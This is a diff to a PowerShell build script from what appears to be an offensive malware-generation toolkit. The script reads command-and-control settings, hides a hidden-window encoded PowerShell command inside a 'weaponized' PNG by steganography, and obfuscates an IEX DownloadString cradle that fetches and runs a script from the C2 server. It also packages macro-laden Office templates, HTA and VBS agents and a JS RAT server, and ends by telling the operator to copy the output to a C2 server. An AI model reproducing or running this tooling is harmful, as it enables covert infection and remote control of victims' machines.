@@ -22,10 +22,12 @@ md ico;
 Write-Host "Integrating parameters from 'config.ini' file in variables... `n" -ForegroundColor DarkGreen;
 #$usbspreading = $settings.Get_Item("usbspreading")
 $getc2 = $settings.Get_Item("getC2")
-$keyreadgetC2 = $settings.Get_Item("keytoreadgetC2")
+$keyreadgetC2 = $settings.Get_Item("keyreadgetC2")
 $rootfolder = $settings.Get_Item("rootfolder")
+$linkfolder = $settings.Get_Item("linkfolder")
 $ops = $settings.Get_Item("ops")
 $upgradepshell = $settings.Get_Item("upgradepshell")
+$offlinemode = $settings.Get_Item("offlinemode")
 $sleeptime1 = $settings.Get_Item("sleeptime1")
 $sleeptime2 = $settings.Get_Item("sleeptime2")
 $sleeptime3 = $settings.Get_Item("sleeptime3")
@@ -44,6 +46,7 @@ $wmikey = $settings.Get_Item("wmikey")
 $passcrypt = $settings.Get_Item("passcrypt")
 $thatsalt = $settings.Get_Item("salt")
 $obfuscationToken = $settings.Get_Item("obfuscationToken")
+$c2channel = $settings.Get_Item("c2channel")
 Import-Module .\obfuscator\Invoke-Obfuscation.psd1
 
 $getc2
@@ -576,8 +579,12 @@ function Out-PNG {
 Import-Module .\stego.ps1
 echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.ps1
 Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath .\$evilimage -ImageDestinationPath .\png\$evilimage -PayloadSource Text -PayloadPath .\bat\pnt.ps1
-Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/link/$evilimage -PayloadSource Text -PayloadPath .\png\imageStego.txt
+Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/link/$evilimage -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
 }
+Out-PNG
+Write-Host "Weaponized PNG file : RENAME-ME-evil.PNG"
+add-content ./stego.ps1 -Value "VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN URL. Type URL of Evil image : '" 
+add-content ./stego.ps1 -Value "Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath VAR_IMAGE_URL -PayloadSource Text -PayloadPath .\InfectWithPNG.txt"
 
 function Out-Obfuscate {
 	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/link/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
@@ -585,22 +592,23 @@ function Out-Obfuscate {
 	cscript.exe .\obfuscator\vbs_obfuscator.vbs .\vbs\agent.vbs > .\vbs\agent_obfuscated.vbs
 	}
 Out-Obfuscate
-	
 Write-Host "Obfuscation OK "
 Write-Host "--------------> 90 %" -ForegroundColor DarkGreen;
+
 echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.bat
 copy .\bat\pnt.bat .\c2c
 copy .\c2c\pnt-Encoded.bat .\bat
+copy .\png\$evilimage .\c2c
 move .\pnt.SED .\exe
-set-content .\payload.ps1 -Value ""
-Rename-Item .\payload.ps1 note.txt
+#set-content .\payload.ps1 -Value ""
+#Rename-Item .\payload.ps1 note.txt
 move .\index.html .\hta
 move .\template.xlsm .\xls
 move .\template.xls .\xls
 move .\template.docm .\xls
 move .\template.doc .\xls
 move .\MacroPack.exe .\xls
-Remove-Item -path .\note.txt
+#Remove-Item -path .\note.txt
 Remove-Item -path .\autorunTemplate.inf
 Write-Host "."
 Write-Host "."
@@ -613,7 +621,9 @@ Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1"
 move .\*.ico .\ico
 move .\ico .\Output
 move .\bat .\Output
-move .\$evilimage .\png
+Rename-Item .\$evilimage OLD.png
+move .\OLD.png .\png
+move .\stego.ps1 .\png
 move .\png .\Output
 move .\hta .\Output
 move .\vbs .\Output
@@ -635,4 +645,7 @@ move .\JSRatServer.ps1 .\Output
 
 Write-Host "Clean tasks"
 Write-Host "---- FINISH ------> 100 %" -ForegroundColor Red;
+
+Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER OF YOUR ACTUAL C2SERVER"
+
 $ooo = Read-Host -Prompt 'OK'
